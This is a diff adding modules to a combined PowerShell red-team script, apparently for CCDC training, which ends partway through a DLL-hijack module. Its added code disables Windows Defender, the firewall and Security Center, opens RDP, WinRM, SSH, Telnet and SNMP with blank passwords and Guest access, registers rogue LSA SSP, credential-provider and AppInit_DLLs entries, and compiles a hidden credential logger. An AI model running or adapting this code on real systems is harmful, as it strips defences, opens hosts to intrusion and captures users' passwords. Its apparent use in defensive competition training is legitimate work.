@@ -13,6 +13,16 @@
 #                         (2 tasks: Notepad alert every 3 min + service killer every 3 min)
 #   4. Persistence       - CCDC_Windows_Persist_ClusterShells.ps1
 #                         (5-location startup persistence; prompts for payload path)
+#   5. Defender Neuter   - CCDC_Windows_DefenderNeuter.ps1
+#                         (disable Defender, Firewall, Security Center)
+#   6. Remote Access     - CCDC_Windows_RemoteAccess_OpenDoorPolicy.ps1
+#                         (misconfigure RDP, WinRM, SSH, Telnet, SNMP)
+#   7. LSA Loot          - CCDC_Windows_LSA_LootTheVault.ps1
+#                         (LSA SSP/CredProvider/AppInit credential harvesting simulation)
+#   8. DLL Hook          - CCDC_Windows_DLL_HookLineAndSinker.ps1
+#                         (AppInit_DLLs, AppCert DLLs, search-order hijack artifacts)
+#   9. SysInternals      - CCDC_Windows_SysInternals_SysInternalsNuker.ps1
+#                         (7-layer block: IFEO, AppLocker, hosts, WebClient, FW, ACL, watchdog)
 #
 # Usage:
 #   Interactive menu  : .\CCDC_Windows_COMBINED.ps1
@@ -52,7 +62,7 @@ Write-Host ""
 # (from CCDC_Windows_Users_UsersAreInYourWalls.ps1)
 # =============================================================================
 function Invoke-RogueUsers {
-    Write-Section "1/4  - Rogue Users: AD Domain Admin backdoors"
+    Write-Section "1/9  - Rogue Users: AD Domain Admin backdoors"
 
     # Pull domain info dynamically
     try {
@@ -160,7 +170,7 @@ function Invoke-RogueUsers {
 # (from CCDC_Windows_WebShell_SheWebShellOnMyIIS.ps1)
 # =============================================================================
 function Invoke-RogueWebShell {
-    Write-Section "2/4  - Web Shell: Rogue IIS site on port 777"
+    Write-Section "2/9  - Web Shell: Rogue IIS site on port 777"
 
     $SiteName    = "evilwebpage"
     $SitePort    = 777
@@ -405,7 +415,7 @@ function Invoke-RogueWebShell {
 # (from CCDC_Windows__ScheduledTasks_ScheduledTaskinator.ps1)
 # =============================================================================
 function Invoke-ScheduledTasks {
-    Write-Section "3/4  - Scheduled Tasks: Notepad alert + service killer"
+    Write-Section "3/9  - Scheduled Tasks: Notepad alert + service killer"
 
     # ========== TASK 1: SillyNotepadAlert ==========
     $Task1Name        = "NotepadAlert"
@@ -535,7 +545,7 @@ foreach ($svc in $services) {
 # (from CCDC_Windows_Persist_ClusterShells.ps1)
 # =============================================================================
 function Invoke-PersistencePlanter {
-    Write-Section "4/4  - Persistence: 5-location startup planter"
+    Write-Section "4/9  - Persistence: 5-location startup planter"
 
     $PayloadPath = ""
     while ([string]::IsNullOrWhiteSpace($PayloadPath)) {
@@ -657,6 +667,857 @@ function Invoke-PersistencePlanter {
 }
 
 # =============================================================================
+# 5. DEFENDER NEUTER  - Disable Windows Defender, Firewall, Security Center
+# (from CCDC_Windows_DefenderNeuter.ps1)
+# =============================================================================
+function Invoke-DefenderNeuter {
+    Write-Section "5/9  - Defender Neuter: Disable Defender, Firewall, Security Center"
+
+    # Best-effort throughout -- Defender steps must not abort on partial failure
+    $local:ErrorActionPreference = "Continue"
+
+    # -- Section 1: Windows Firewall ------------------------------------------
+    Write-Info "Disabling all firewall profiles..."
+    try {
+        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction Stop
+        Write-Success "  All profiles disabled."
+    } catch { Write-Err "  Set-NetFirewallProfile failed: $_" }
+
+    Write-Info "Removing all firewall rules..."
+    try {
+        Remove-NetFirewallRule -All -ErrorAction SilentlyContinue
+        Write-Success "  All rules removed."
+    } catch { Write-Warn "  Remove-NetFirewallRule threw: $_" }
+
+    Write-Info "Killing Windows Firewall service (mpssvc)..."
+    try {
+        Set-Service -Name mpssvc -StartupType Disabled -ErrorAction SilentlyContinue
+        Stop-Service -Name mpssvc -Force -ErrorAction SilentlyContinue
+        Write-Success "  mpssvc stopped and set to Disabled."
+    } catch { Write-Warn "  mpssvc service change: $_" }
+
+    Write-Info "Stomping firewall registry for all profiles..."
+    $fwBase     = 'HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy'
+    $fwProfiles = @('DomainProfile', 'StandardProfile', 'PublicProfile')
+    foreach ($p in $fwProfiles) {
+        $keyPath = "$fwBase\$p"
+        try {
+            if (-not (Test-Path $keyPath)) { New-Item -Path $keyPath -Force | Out-Null }
+            Set-ItemProperty -Path $keyPath -Name EnableFirewall         -Value 0 -Type DWord -Force
+            Set-ItemProperty -Path $keyPath -Name DisableNotifications   -Value 1 -Type DWord -Force
+            Set-ItemProperty -Path $keyPath -Name DoNotAllowExceptions   -Value 0 -Type DWord -Force
+            Write-Success "  $p registry set."
+        } catch { Write-Err "  Failed on $p : $_" }
+    }
+
+    # -- Section 2: Windows Defender ------------------------------------------
+    Write-Info "Disabling Tamper Protection via registry..."
+    try {
+        $tpKey = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'
+        if (-not (Test-Path $tpKey)) { New-Item -Path $tpKey -Force | Out-Null }
+        Set-ItemProperty -Path $tpKey -Name TamperProtection -Value 4 -Type DWord -Force
+        Write-Success "  TamperProtection set to 4 (off)."
+    } catch { Write-Warn "  Could not set TamperProtection: $_" }
+
+    Write-Info "Disabling Defender via Set-MpPreference..."
+    $mpPrefs = @{
+        DisableRealtimeMonitoring   = $true
+        DisableIOAVProtection       = $true
+        DisableBehaviorMonitoring   = $true
+        DisableBlockAtFirstSeen     = $true
+        DisableScriptScanning       = $true
+        SubmitSamplesConsent        = 2
+        MAPSReporting               = 0
+    }
+    foreach ($pref in $mpPrefs.GetEnumerator()) {
+        try {
+            Set-MpPreference -$($pref.Key) $pref.Value -ErrorAction SilentlyContinue
+            Write-Success "  $($pref.Key) = $($pref.Value)"
+        } catch { Write-Warn "  Set-MpPreference $($pref.Key) : $_" }
+    }
+
+    Write-Info "Writing Defender policy registry keys..."
+    $defPolicyKeys = @(
+        @{ Path = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
+           Values = @{ DisableAntiSpyware = 1; DisableAntiVirus = 1 } },
+        @{ Path = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'
+           Values = @{ DisableRealtimeMonitoring = 1; DisableBehaviorMonitoring = 1; DisableOnAccessProtection = 1; DisableScanOnRealtimeEnable = 1 } },
+        @{ Path = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet'
+           Values = @{ SpynetReporting = 0; SubmitSamplesConsent = 2 } }
+    )
+    foreach ($entry in $defPolicyKeys) {
+        try {
+            if (-not (Test-Path $entry.Path)) { New-Item -Path $entry.Path -Force | Out-Null }
+            foreach ($val in $entry.Values.GetEnumerator()) {
+                Set-ItemProperty -Path $entry.Path -Name $val.Key -Value $val.Value -Type DWord -Force
+            }
+            Write-Success "  $($entry.Path) written."
+        } catch { Write-Err "  Registry write failed [$($entry.Path)]: $_" }
+    }
+
+    Write-Info "Disabling Defender services..."
+    $defServices = @('WinDefend', 'WdNisSvc', 'WdNisDrv', 'WdFilter', 'WdBoot', 'SecurityHealthService')
+    foreach ($svc in $defServices) {
+        try {
+            $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
+            if ($s) {
+                Stop-Service    -Name $svc -Force -ErrorAction SilentlyContinue
+                Set-Service     -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
+                $svcRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
+                if (Test-Path $svcRegPath) {
+                    Set-ItemProperty -Path $svcRegPath -Name ImagePath -Value "C:\Windows\system32\sc.exe" -Type ExpandString -Force -ErrorAction SilentlyContinue
+                    Set-ItemProperty -Path $svcRegPath -Name Start     -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue
+                }
+                Write-Success "  $svc stopped, disabled, ImagePath neutered."
+            } else {
+                Write-Warn "  $svc not found on this SKU -- skipping."
+            }
+        } catch { Write-Warn "  $svc : $_" }
+    }
+
+    Write-Info "Removing Defender scheduled tasks..."
+    $defTasks = @(
+        'Windows Defender Cache Maintenance',
+        'Windows Defender Cleanup',
+        'Windows Defender Scheduled Scan',
+        'Windows Defender Verification'
+    )
+    foreach ($task in $defTasks) {
+        try {
+            Unregister-ScheduledTask -TaskName $task `
+                -TaskPath '\Microsoft\Windows\Windows Defender\' `
+                -Confirm:$false -ErrorAction SilentlyContinue
+            Write-Success "  Task removed: $task"
+        } catch { Write-Warn "  Could not remove task '$task': $_" }
+    }
+
+    Write-Info "Attempting Server feature removal (Server SKU only)..."
+    try {
+        if (Get-Command Get-WindowsFeature -ErrorAction SilentlyContinue) {
+            foreach ($feat in @('Windows-Defender', 'Windows-Defender-GUI')) {
+                $f = Get-WindowsFeature -Name $feat -ErrorAction SilentlyContinue
+                if ($f -and $f.Installed) {
+                    Uninstall-WindowsFeature -Name $feat -Remove -ErrorAction SilentlyContinue | Out-Null
+                    Write-Success "  Uninstalled feature: $feat"
+                } else {
+                    Write-Warn "  Feature '$feat' not installed or not found."
+                }
+            }
+        } else {
+            Write-Warn "  Get-WindowsFeature not available -- not a Server SKU, skipping."
+        }
+    } catch { Write-Warn "  Server feature removal: $_" }
+
+    Write-Info "Attempting DISM feature removal (all SKUs)..."
+    try {
+        $dismOut = & dism.exe /Online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /Quiet 2>&1
+        if ($LASTEXITCODE -eq 0)    { Write-Success "  DISM removed Windows-Defender feature." }
+        elseif ($LASTEXITCODE -eq 3010) { Write-Warn "  DISM: removal staged, reboot required." }
+        elseif ($LASTEXITCODE -eq 2)    { Write-Warn "  DISM: feature already absent or not applicable." }
+        else { Write-Warn "  DISM exit $LASTEXITCODE : $dismOut" }
+    } catch { Write-Warn "  DISM call failed: $_" }
+
+    Write-Info "Locking down Defender directories via ACL..."
+    foreach ($dir in @('C:\Program Files\Windows Defender', 'C:\ProgramData\Microsoft\Windows Defender')) {
+        if (Test-Path $dir) {
+            try {
+                & takeown.exe /F "$dir" /R /A /D Y 2>&1 | Out-Null
+                & icacls.exe  "$dir" /deny "*S-1-1-0:(OI)(CI)(RX)" /T /Q 2>&1 | Out-Null
+                Write-Success "  ACL locked: $dir"
+            } catch { Write-Warn "  ACL lock failed for $dir : $_" }
+        } else {
+            Write-Warn "  Directory not found (already removed?): $dir"
+        }
+    }
+
+    # -- Section 3: Security Center -------------------------------------------
+    Write-Info "Disabling Security Center service (wscsvc)..."
+    try {
+        Stop-Service  -Name wscsvc -Force -ErrorAction SilentlyContinue
+        Set-Service   -Name wscsvc -StartupType Disabled -ErrorAction SilentlyContinue
+        Write-Success "  wscsvc stopped and disabled."
+    } catch { Write-Warn "  wscsvc: $_" }
+
+    Write-Info "Suppressing Security Center notifications via registry..."
+    try {
+        $scKey = 'HKLM:\SOFTWARE\Microsoft\Security Center'
+        if (-not (Test-Path $scKey)) { New-Item -Path $scKey -Force | Out-Null }
+        $scValues = @{
+            AntiVirusDisableNotify  = 1
+            FirewallDisableNotify   = 1
+            AntiVirusOverride       = 1
+            FirewallOverride        = 1
+            UacDisableNotify        = 1
+            UpdatesDisableNotify    = 1
+        }
+        foreach ($val in $scValues.GetEnumerator()) {
+            Set-ItemProperty -Path $scKey -Name $val.Key -Value $val.Value -Type DWord -Force
+        }
+        Write-Success "  Security Center notifications suppressed."
+    } catch { Write-Err "  Security Center registry: $_" }
+
+    Write-Success "Defender neuter complete. Some components survive until reboot."
+}
+
+# =============================================================================
+# 6. REMOTE ACCESS  - Misconfigure RDP, WinRM, SSH, Telnet, SNMP
+# (from CCDC_Windows_RemoteAccess_OpenDoorPolicy.ps1)
+# =============================================================================
+function Invoke-RemoteAccess {
+    Write-Section "6/9  - Remote Access: Misconfigure RDP, WinRM, SSH, Telnet, SNMP"
+
+    $RdpRegPath      = "HKLM:\System\CurrentControlSet\Control\Terminal Server"
+    $RdpWinStaPath   = "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
+    $LsaRegPath      = "HKLM:\System\CurrentControlSet\Control\Lsa"
+    $SshConfigPath   = "C:\ProgramData\ssh\sshd_config"
+    $SshConfigBackup = "C:\ProgramData\ssh\sshd_config.ccdc.bak"
+    $TelnetRegPath   = "HKLM:\SOFTWARE\Microsoft\TelnetServer\1.0"
+    $SnmpBasePath    = "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters"
+
+    # -- RDP (TCP 3389) --------------------------------------------------------
+    Write-Info "Configuring RDP (TCP 3389)..."
+    try {
+        Set-ItemProperty -Path $RdpRegPath    -Name "fDenyTSConnections" -Value 0 -Type DWord -ErrorAction Stop
+        Set-ItemProperty -Path $RdpWinStaPath -Name "UserAuthentication"  -Value 0 -Type DWord -ErrorAction Stop
+        Set-ItemProperty -Path $RdpWinStaPath -Name "SecurityLayer"        -Value 0 -Type DWord -ErrorAction Stop
+        Set-ItemProperty -Path $LsaRegPath    -Name "LimitBlankPasswordUse" -Value 0 -Type DWord -ErrorAction Stop
+        Set-ItemProperty -Path $RdpRegPath    -Name "MaxInstanceCount"     -Value 0xFFFF -Type DWord -ErrorAction Stop
+        Write-Warn "  NLA disabled, blank passwords allowed, session limit removed"
+
+        try {
+            $sid     = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
+            $account = $sid.Translate([System.Security.Principal.NTAccount])
+            Add-LocalGroupMember -Group "Remote Desktop Users" -Member $account -ErrorAction Stop
+            Write-Warn "  Authenticated Users added to Remote Desktop Users"
+        } catch { Write-Warn "  Authenticated Users may already be in RDP group: $_" }
+
+        net user Guest /active:yes 2>&1 | Out-Null
+        try {
+            Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Guest" -ErrorAction Stop
+            Write-Warn "  Guest enabled and added to Remote Desktop Users"
+        } catch { Write-Warn "  Guest may already be in RDP group: $_" }
+
+        Set-Service -Name "TermService" -StartupType Automatic -ErrorAction Stop
+        Start-Service -Name "TermService" -ErrorAction Stop
+        Write-Success "  TermService started (Automatic)"
+
+        if (-not (Get-NetFirewallRule -DisplayName "CCDC-RDP-Any" -ErrorAction SilentlyContinue)) {
+            New-NetFirewallRule -DisplayName "CCDC-RDP-Any" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow -RemoteAddress Any | Out-Null
+            Write-Success "  Firewall rule: TCP 3389 any-source"
+        }
+    } catch { Write-Err "RDP setup failed: $_" }
+
+    # -- WinRM (TCP 5985) ------------------------------------------------------
+    Write-Info "Configuring WinRM (TCP 5985)..."
+    try {
+        Enable-PSRemoting -Force -SkipNetworkProfileCheck -ErrorAction Stop
+        Set-Item WSMan:\localhost\Client\TrustedHosts       -Value '*' -Force -ErrorAction Stop
+        Set-Item WSMan:\localhost\Service\Auth\Basic        -Value $true -ErrorAction Stop
+        Set-Item WSMan:\localhost\Service\AllowUnencrypted  -Value $true -ErrorAction Stop
+        Enable-WSManCredSSP -Role Server -Force -ErrorAction Stop
+        Set-Item WSMan:\localhost\Shell\MaxMemoryPerShellMB -Value 2048 -ErrorAction Stop
+        Write-Warn "  TrustedHosts=*, Basic auth, unencrypted HTTP, CredSSP enabled"
+
+        if (-not (Get-NetFirewallRule -DisplayName "CCDC-WinRM-Any" -ErrorAction SilentlyContinue)) {
+            New-NetFirewallRule -DisplayName "CCDC-WinRM-Any" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -RemoteAddress Any | Out-Null
+            Write-Success "  Firewall rule: TCP 5985 any-source"
+        }
+    } catch { Write-Err "WinRM setup failed: $_" }
+
+    # -- OpenSSH (TCP 22) ------------------------------------------------------
+    Write-Info "Configuring OpenSSH Server (TCP 22)..."
+    try {
+        $cap = Get-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop
+        if ($cap.State -ne "Installed") {
+            Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop | Out-Null
+            Write-Success "  OpenSSH Server installed"
+        }
+
+        if ((Test-Path $SshConfigPath) -and (-not (Test-Path $SshConfigBackup))) {
+            Copy-Item $SshConfigPath $SshConfigBackup -ErrorAction Stop
+            Write-Info "  Original sshd_config backed up"
+        }
+
+        $sshdConfig = @"
+# CCDC Training - Deliberately Misconfigured sshd_config
+Port 22
+ListenAddress 0.0.0.0
+PermitRootLogin yes
+PasswordAuthentication yes
+PermitEmptyPasswords yes
+UsePAM no
+MaxAuthTries 100
+LoginGraceTime 120
+MaxSessions 50
+AllowTcpForwarding yes
+GatewayPorts yes
+PermitTunnel yes
+X11Forwarding yes
+LogLevel QUIET
+Subsystem sftp C:/Windows/System32/OpenSSH/sftp-server.exe
+"@
+        $sshdConfig | Set-Content -Path $SshConfigPath -Encoding UTF8 -ErrorAction Stop
+        Write-Warn "  PermitEmptyPasswords, PermitRootLogin, MaxAuthTries 100, LogLevel QUIET"
+
+        $psExe = (Get-Command powershell.exe -ErrorAction SilentlyContinue).Source
+        if ($psExe) {
+            $sshRegPath = "HKLM:\SOFTWARE\OpenSSH"
+            if (-not (Test-Path $sshRegPath)) { New-Item -Path $sshRegPath -Force | Out-Null }
+            Set-ItemProperty -Path $sshRegPath -Name "DefaultShell" -Value $psExe -ErrorAction Stop
+        }
+
+        Set-Service -Name "sshd" -StartupType Automatic -ErrorAction Stop
+        Restart-Service -Name "sshd" -ErrorAction Stop
+        Write-Success "  sshd started (Automatic)"
+
+        if (-not (Get-NetFirewallRule -DisplayName "CCDC-SSH-Any" -ErrorAction SilentlyContinue)) {
+            New-NetFirewallRule -DisplayName "CCDC-SSH-Any" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -RemoteAddress Any | Out-Null
+            Write-Success "  Firewall rule: TCP 22 any-source"
+        }
+    } catch { Write-Err "OpenSSH configuration failed: $_" }
+
+    # -- Telnet (TCP 23) -------------------------------------------------------
+    Write-Info "Configuring Telnet Server (TCP 23)..."
+    try {
+        $feature = Get-WindowsFeature -Name Telnet-Server -ErrorAction Stop
+        if ($feature.InstallState -ne "Installed") {
+            Install-WindowsFeature -Name Telnet-Server -ErrorAction Stop | Out-Null
+            Write-Success "  Telnet Server installed"
+        }
+
+        if (-not (Test-Path $TelnetRegPath)) { New-Item -Path $TelnetRegPath -Force | Out-Null }
+        Set-ItemProperty -Path $TelnetRegPath -Name "AuthenticationMode"  -Value 3     -Type DWord -ErrorAction Stop
+        Set-ItemProperty -Path $TelnetRegPath -Name "SessionTimeout"      -Value 0     -Type DWord -ErrorAction Stop
+        Set-ItemProperty -Path $TelnetRegPath -Name "MaxConnections"      -Value 999   -Type DWord -ErrorAction Stop
+        Set-ItemProperty -Path $TelnetRegPath -Name "AllowTrustedDomain"  -Value 1     -Type DWord -ErrorAction Stop
+        Write-Warn "  AuthMode=3 (NTLM+cleartext), SessionTimeout=0, MaxConnections=999"
+
+        Set-Service  -Name "TlntSvr" -StartupType Automatic -ErrorAction Stop
+        Start-Service -Name "TlntSvr" -ErrorAction Stop
+        Write-Success "  TlntSvr started (Automatic)"
+
+        if (-not (Get-NetFirewallRule -DisplayName "CCDC-Telnet-Any" -ErrorAction SilentlyContinue)) {
+            New-NetFirewallRule -DisplayName "CCDC-Telnet-Any" -Direction Inbound -Protocol TCP -LocalPort 23 -Action Allow -RemoteAddress Any | Out-Null
+            Write-Success "  Firewall rule: TCP 23 any-source"
+        }
+    } catch { Write-Err "Telnet configuration failed: $_" }
+
+    # -- SNMP (UDP 161) --------------------------------------------------------
+    Write-Info "Configuring SNMP Service (UDP 161)..."
+    try {
+        $feature = Get-WindowsFeature -Name SNMP-Service -ErrorAction Stop
+        if ($feature.InstallState -ne "Installed") {
+            Install-WindowsFeature -Name SNMP-Service -IncludeManagementTools -ErrorAction Stop | Out-Null
+            Write-Success "  SNMP Service installed"
+        }
+
+        $validCommPath = "$SnmpBasePath\ValidCommunities"
+        if (-not (Test-Path $validCommPath)) { New-Item -Path $validCommPath -Force | Out-Null }
+        Set-ItemProperty -Path $validCommPath -Name "public"  -Value 8 -Type DWord -ErrorAction Stop
+        Set-ItemProperty -Path $validCommPath -Name "private" -Value 8 -Type DWord -ErrorAction Stop
+        Write-Warn "  Communities 'public' and 'private' set to READ WRITE (8)"
+
+        $permMgrPath = "$SnmpBasePath\PermittedManagers"
+        if (Test-Path $permMgrPath) { Remove-Item -Path $permMgrPath -Recurse -Force -ErrorAction Stop }
+        Write-Warn "  PermittedManagers removed (all source IPs permitted)"
+
+        Set-ItemProperty -Path $SnmpBasePath -Name "EnableAuthenticationTraps" -Value 0 -Type DWord -ErrorAction Stop
+        Write-Warn "  EnableAuthenticationTraps = 0 (failed-auth traps suppressed)"
+
+        Set-Service  -Name "SNMP" -StartupType Automatic -ErrorAction Stop
+        Restart-Service -Name "SNMP" -ErrorAction Stop
+        Write-Success "  SNMP started (Automatic)"
+
+        if (-not (Get-NetFirewallRule -DisplayName "CCDC-SNMP-Any" -ErrorAction SilentlyContinue)) {
+            New-NetFirewallRule -DisplayName "CCDC-SNMP-Any" -Direction Inbound -Protocol UDP -LocalPort 161 -Action Allow -RemoteAddress Any | Out-Null
+            Write-Success "  Firewall rule: UDP 161 any-source"
+        }
+    } catch { Write-Err "SNMP configuration failed: $_" }
+
+    Write-Success "Remote Access misconfiguration complete."
+    Write-Warn "  Services: RDP(3389), WinRM(5985), SSH(22), Telnet(23), SNMP(161)"
+}
+
+# =============================================================================
+# 7. LSA LOOT THE VAULT  - LSA credential harvesting simulation
+# (from CCDC_Windows_LSA_LootTheVault.ps1)
+# =============================================================================
+function Invoke-LSALootTheVault {
+    Write-Section "7/9  - LSA Loot: SSP/CredProvider/AppInit credential harvesting"
+
+    function Write-Status { param($m, $t='Info')
+        switch ($t) {
+            'Success' { Write-Success $m }
+            'Error'   { Write-Err     $m }
+            'Warning' { Write-Warn    $m }
+            default   { Write-Info    $m }
+        }
+    }
+
+    $trainingDir = "C:\Windows\Temp\ccdc_lsa_training"
+    if (-not (Test-Path $trainingDir)) {
+        $null = New-Item -ItemType Directory -Path $trainingDir -Force -ErrorAction Stop
+        Write-Status "Created training directory: $trainingDir" 'Success'
+    }
+
+    # Step 1: Compile C# credential logging assembly
+    Write-Status "Step 1: Creating credential logging mechanism..."
+    $csharpCode = @"
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+
+public class CCDCCredentialLogger {
+    public static void LogCredentials(string username, string password, string logonType) {
+        try {
+            string logPath = @"C:\Windows\Temp\ccdc_credentials.log";
+            string logEntry = string.Format("[{0:yyyy-MM-dd HH:mm:ss}] Username: {1} | Password: {2} | Type: {3}{4}",
+                DateTime.Now, username, password, logonType, Environment.NewLine);
+            File.AppendAllText(logPath, logEntry);
+            File.SetAttributes(logPath, FileAttributes.Hidden);
+        } catch {}
+    }
+}
+"@
+    $assemblyPath = "$trainingDir\CCDCCredentialLogger.dll"
+    if (-not (Test-Path $assemblyPath)) {
+        try {
+            Add-Type -TypeDefinition $csharpCode -Language CSharp -OutputAssembly $assemblyPath -OutputType Library -ErrorAction Stop
+            Write-Status "Created credential logging assembly" 'Success'
+        } catch {
+            Write-Status "C# compilation fallback (marker file): $($_.Exception.Message)" 'Warning'
+            Set-Content -Path $assemblyPath -Value "CCDC_TRAINING_ASSEMBLY_MARKER"
+        }
+    }
+
+    # Step 2: Credential provider hook script
+    Write-Status "Step 2: Setting up credential provider interception..."
+    $credProviderPs1 = @'
+$logPath = 'C:\Windows\Temp\ccdc_credentials.log'
+$credentialContent = "[CCDC Training Credential Provider - Active]`nThis hook intercepts Windows credential requests at the logon screen."
+Add-Content -Path $logPath -Value "[$(Get-Date)] Credential provider hook active`n$credentialContent`n"
+exit 0
+'@
+    Set-Content -Path "$trainingDir\CredentialProvider.ps1" -Value $credProviderPs1 -Encoding UTF8
+    Write-Status "Created credential provider hook script" 'Success'
+
+    # Step 3: SSP injection via registry
+    Write-Status "Step 3: Registering malicious SSP in LSA..."
+    $lsaPath = "HKLM:\System\CurrentControlSet\Control\Lsa"
+    try {
+        $currentPackages = (Get-ItemProperty -Path $lsaPath -Name "SecurityPackages" -ErrorAction SilentlyContinue).SecurityPackages
+        $backupPath = "HKLM:\System\CurrentControlSet\Control\Lsa\ccdc_backup"
+        if (-not (Test-Path $backupPath)) {
+            New-Item -Path $backupPath -Force -ErrorAction SilentlyContinue | Out-Null
+            Set-ItemProperty -Path $backupPath -Name "OriginalPackages" -Value $currentPackages -ErrorAction SilentlyContinue
+        }
+        $ccdc_ssp = "$trainingDir\ccdc_ssp.dll"
+        Set-Content -Path $ccdc_ssp -Value "CCDC_TRAINING_SSP_MARKER"
+        $newPackages = if ($currentPackages) { "$currentPackages,CCDCTrainingSsp" } else { "CCDCTrainingSsp" }
+        Set-ItemProperty -Path $lsaPath -Name "SecurityPackages" -Value $newPackages -ErrorAction Stop
+        Write-Status "SSP registration updated (training mode)" 'Success'
+    } catch { Write-Status "SSP registration skipped: $($_.Exception.Message)" 'Warning' }
+
+    # Step 4: Credential provider GUID registration
+    Write-Status "Step 4: Registering malicious credential provider..."
+    $credProvPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers"
+    try {
+        $ccdc_guid = "{CCDC0000-0000-0000-0000-000000000001}"
+        $providerKeyPath = "$credProvPath\$ccdc_guid"
+        if (-not (Test-Path $providerKeyPath)) {
+            New-Item -Path $providerKeyPath -Force -ErrorAction Stop | Out-Null
+            Set-ItemProperty -Path $providerKeyPath -Name "(Default)" -Value "CCDC Training Credential Provider" -ErrorAction Stop
+            Set-Content -Path "$trainingDir\CCDCCredentialProvider.dll" -Value "CCDC_TRAINING_CREDPROV_MARKER"
+            Write-Status "Credential provider registered" 'Success'
+        }
+    } catch { Write-Status "Credential provider registration skipped: $($_.Exception.Message)" 'Warning' }
+
+    # Step 5: LSA notification package
+    Write-Status "Step 5: Registering LSA notification package..."
+    $lsaNotifyPath = "HKLM:\System\CurrentControlSet\Control\Lsa\Notification Packages"
+    try {
+        if (Test-Path -Path $lsaNotifyPath) {
+            $currentNotify = (Get-ItemProperty -Path $lsaNotifyPath -Name "" -ErrorAction SilentlyContinue).'(Default)'
+            if ($currentNotify -notlike "*CCDCNotify*") {
+                $newNotify = if ($currentNotify) { "$currentNotify,CCDCNotify" } else { "CCDCNotify" }
+                Set-ItemProperty -Path $lsaNotifyPath -Name "" -Value $newNotify -ErrorAction Stop
+                Write-Status "LSA notification package registered" 'Success'
+            }
+        }
+    } catch { Write-Status "LSA notification skipped: $($_.Exception.Message)" 'Warning' }
+
+    # Step 6: AppInit_DLLs
+    Write-Status "Step 6: Setting up AppInit_DLLs (global injection point)..."
+    $appInitPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
+    try {
+        if (Test-Path -Path $appInitPath) {
+            $appInitDll = "$trainingDir\AppInit_CCDC.dll"
+            Set-Content -Path $appInitDll -Value "CCDC_TRAINING_APPINIT_MARKER" -ErrorAction Stop
+            Set-ItemProperty -Path $appInitPath -Name "AppInit_DLLs"      -Value $appInitDll -ErrorAction Stop
+            Set-ItemProperty -Path $appInitPath -Name "LoadAppInit_DLLs"  -Value 1 -ErrorAction Stop
+            Write-Status "AppInit_DLLs registered (training mode)" 'Success'
+        }
+    } catch { Write-Status "AppInit_DLLs setup failed: $($_.Exception.Message)" 'Warning' }
+
+    # Step 7: Credential harvest log file
+    Write-Status "Step 7: Initializing credential logging..."
+    $logFile = "C:\Windows\Temp\ccdc_credentials.log"
+    $logContent = @"
+================================================================================
+                   CCDC WINDOWS CREDENTIAL HARVESTING LOG
+================================================================================
+Timestamp: $(Get-Date)
+System: $env:COMPUTERNAME
+User: $env:USERNAME
+
+This log demonstrates what a malicious SSP can capture during authentication.
+
+CAPTURED CREDENTIALS:
+================================================================================
+
+"@
+    Set-Content -Path $logFile -Value $logContent
+    (Get-Item $logFile).Attributes = 'Hidden'
+    Write-Status "Credential log created (hidden)" 'Success'
+
+    Write-Success "LSA Loot complete. Registry injection points:"
+    Write-Info "  LSA\SecurityPackages, Authentication\Credential Providers"
+    Write-Info "  LSA\Notification Packages, Windows\AppInit_DLLs"
+    Write-Warn "  To cleanup: .\CCDC_Windows_LSA_LootTheVault.ps1 -Cleanup"
+}
+
+# =============================================================================
+# 8. DLL HOOK LINE AND SINKER  - AppInit_DLLs, AppCert DLLs, search-order hijack
+# (from CCDC_Windows_DLL_HookLineAndSinker.ps1)
+# =============================================================================
+function Invoke-DLLHookLineAndSinker {
+    Write-Section "8/9  - DLL Hook: AppInit_DLLs, AppCert DLLs, search-order hijack"
+
+    function Write-Status { param($m, $t='Info')
+        switch ($t) {
+            'Success' { Write-Success $m }
+            'Error'   { Write-Err     $m }
+            'Warning' { Write-Warn    $m }
+            default   { Write-Info    $m }
+        }
+    }
+
+    $injectionDir = "C:\Windows\Temp\ccdc_dll_injection"
+    if (-not (Test-Path $injectionDir)) {
+        $null = New-Item -ItemType Directory -Path $injectionDir -Force -ErrorAction Stop
+        Write-Status "Created injection directory: $injectionDir" 'Success'
+    }
+
+    # Step 1: Marker DLL files
+    Write-Status "Step 1: Creating DLL injection infrastructure..."
+    $markerDlls = @("ccdc_hook.dll", "ccdc_inject.dll", "version.dll", "msvcrt.dll", "dxgi.dll")
+    foreach ($dll in $markerDlls) {
+        $dllPath = Join-Path $injectionDir $dll
+        if (-not (Test-Path $dllPath)) {
+            Set-Content -Path $dllPath -Value "CCDC_TRAINING_DLL_MARKER - $dll"
+            (Get-Item $dllPath).Attributes = 'Hidden'
+        }
+    }
+    Write-Status "Marker DLL files created in $injectionDir" 'Success'
+
+    # Step 2: AppInit_DLLs
+    Write-Status "Step 2: Registering AppInit_DLLs (global injection point)..."
+    $appInitPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
+    try {
+        $backupPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ccdc_backup"
+        if (-not (Test-Path $backupPath)) {
